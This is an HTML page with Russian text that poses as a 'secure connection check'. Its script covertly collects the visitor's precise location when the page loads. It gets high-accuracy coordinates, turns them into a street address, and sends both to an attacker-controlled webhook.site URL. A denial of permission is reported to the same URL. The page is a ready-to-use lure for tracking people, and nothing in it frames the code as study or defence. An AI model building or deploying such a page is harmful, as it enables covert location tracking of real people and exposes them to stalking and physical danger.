<!DOCTYPE html>
<html>
<head>
    <title>Определение местоположения</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { text-align: center; background: #1a1a1a; padding: 40px; border-radius: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Проверка соединения...</h2>
        <p>Пожалуйста, подождите, устанавливается безопасное соединение.</p>
    </div>

    <script>
        // ТВОЙ УНИКАЛЬНЫЙ WEBHOOK URL
        const WEBHOOK_URL = 'https://webhook.site/d3af164c-08cc-44d0-9f75-bca653c42e4d';

        function sendData(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(e => console.log("Ошибка отправки:", e));
        }

        // Функция для получения адреса по координатам (обратное геокодирование)
        async function getAddress(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
                const data = await response.json();
                return data.display_name || "Адрес не найден";
            } catch (e) {
                return "Ошибка получения адреса";
            }
        }

        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const address = await getAddress(lat, lon);
                    
                    const data = {
                        status: "ok",
                        lat: lat,
                        lon: lon,
                        accuracy: position.coords.accuracy,
                        address: address,
                        time: new Date().toISOString()
                    };
                    sendData(data);
                    document.body.innerHTML = "<div class='box'><h2>Проверка завершена</h2></div>";
                },
                (err) => {
                    // Здесь мы отправляем причину отказа (например, "User denied Geolocation")
                    sendData({ status: "error", error: err.message });
                    document.body.innerHTML = "<div class='box'><h2>Ошибка</h2><p>Попробуйте позже</p></div>";
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            sendData({ status: "error", error: "Geolocation not supported" });
        }
    </script>
</body>
</html>
